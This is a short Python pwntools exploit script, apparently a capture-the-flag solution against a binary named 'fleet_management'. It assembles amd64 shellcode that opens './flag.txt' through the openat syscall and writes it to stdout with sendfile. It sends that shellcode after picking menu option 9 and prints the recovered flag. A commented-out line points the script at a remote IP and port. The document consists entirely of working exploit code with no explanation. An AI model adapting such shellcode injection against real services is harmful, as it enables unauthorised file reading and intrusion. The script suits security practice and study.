from pwn import *

context.arch = "amd64"
shellcode = """
mov ax, 257
mov rdi, -100
mov rdx, 0x0000000000007478
push rdx
mov rdx, 0x742e67616c662f2e
push rdx
mov rsi , rsp
xor rdx, rdx
syscall
mov rsi, rax
mov al, 40
mov rdi, 1
mov r10, 100
syscall"""

shellcode = asm(shellcode)
#r = remote("157.245.33.77" ,30044)
r = process("./fleet_management")
r.sendafter('[*] What do you want to do? ' ,'9')
sleep(2)
r.send(shellcode)
flag = str(r.recvuntil(b"}"))
r.close()
log.info(f"[FLAG] {flag[2:len(flag)-1]}")
